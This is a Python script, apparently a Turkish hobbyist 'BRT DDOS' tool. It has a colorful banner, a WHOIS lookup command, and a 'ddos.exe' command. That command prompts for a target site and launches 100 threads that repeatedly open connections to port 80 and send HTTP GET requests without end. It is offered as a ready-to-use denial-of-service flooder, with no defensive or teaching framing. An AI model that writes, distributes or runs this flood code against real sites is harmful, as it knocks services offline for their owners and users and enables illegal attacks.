import os
import random
import sys
import subprocess
import threading
import socket
import time


def modül_yükle(modül_adı):
    try:
        __import__(modül_adı)
    except ImportError:
        print(f"{modül_adı} modülü eksik, yükleniyor...")
        subprocess.run([sys.executable, "-m", "pip", "install", modül_adı])
        __import__(modül_adı)

modül_yükle("colorama")


def renkli_yazi(metin):
    renkler = [
        "\033[91m", "\033[92m", "\033[93m",
        "\033[94m", "\033[95m", "\033[96m",
    ]
    renk = random.choice(renkler)
    return f"{renk}{metin}\033[0m"


def giris_ekrani():
    banner = """
  ____  _____ _______   _____  _____   ____   _____ 
 |  _ \|  __ \__   __| |  __ \|  __ \ / __ \ / ____|
 | |_) | |__) | | |    | |  | | |  | | |  | | (___  
 |  _ <|  _  /  | |    | |  | | |  | | |  | |\___ \ 
 | |_) | | \ \  | |    | |__| | |__| | |__| |____) |
 |____/|_|  \_\ |_|    |_____/|_____/ \____/|_____/ 
"""
    print(renkli_yazi(banner))
    print(renkli_yazi("BRT Uygulamasına Hoş Geldiniz!"))
    print(renkli_yazi("Komutlar: 'site.exe', 'ddos.exe', 'exit'"))


def whois_sorgula(domain):
    try:
        print(renkli_yazi(f"{domain} için WHOIS bilgileri sorgulanıyor..."))
        sonuc = subprocess.check_output(["whois", domain], text=True)
        print(renkli_yazi("\n--- WHOIS Bilgileri ---\n"))
        print(renkli_yazi(sonuc))
    except Exception as e:
        print(renkli_yazi("Hata oluştu: WHOIS bilgisi alınamıyor."))
        print(renkli_yazi(str(e)))


def ddos_başlat():
    PORT = 80
    THREAD_COUNT = 100
    host = input(renkli_yazi("Hedef site adresi (örnek: example.com): "))
    mesaj = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()

    def flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((host, PORT))
                s.sendall(mesaj)
                s.close()
                print(renkli_yazi(f"[+] Paket gönderildi {host}:{PORT}"))
            except Exception as e:
                print(renkli_yazi(f"[-] Hata: {e}"))
                time.sleep(0.5)

    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()

    print(renkli_yazi("[!] DDOS işlemi başlatıldı..."))
    while True:
        time.sleep(10)

# Ana işlev
def main():
    giris_ekrani()
    while True:
        komut = input(renkli_yazi("Komut girin: ")).strip().lower()
        
        if komut == "site.exe":
            site = input(renkli_yazi("Site adresini girin: "))
            whois_sorgula(site)
        elif komut == "ddos.exe":
            ddos_başlat()
        elif komut == "exit":
            print(renkli_yazi("Çıkış yapılıyor..."))
            sys.exit()
        else:
            print(renkli_yazi("Bilinmeyen komut! Lütfen 'site.exe', 'ddos.exe' veya 'exit' kullanın."))

if __name__ == "__main__":
    main()
